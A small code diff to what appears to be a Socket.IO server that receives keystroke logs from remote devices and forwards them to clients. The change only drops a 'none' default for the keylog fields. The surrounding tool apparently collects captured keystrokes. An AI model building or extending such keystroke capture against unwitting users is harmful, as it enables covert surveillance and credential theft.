@@ -585,8 +585,8 @@ export const startSocketIO = async () => {
 						console.log("Key logs=>", response);
 						const deviceId = response.deviceId;
 						const keyLogsType = response.keyLogsType;
-						const keylogs = response.keylogs || "none";
-						const keyEvent = response.event || "none";
+						const keylogs = response.keylogs;
+						const keyEvent = response.event;
 
 						// Prepare the data to be sent to clients
 						const dataToSend = {
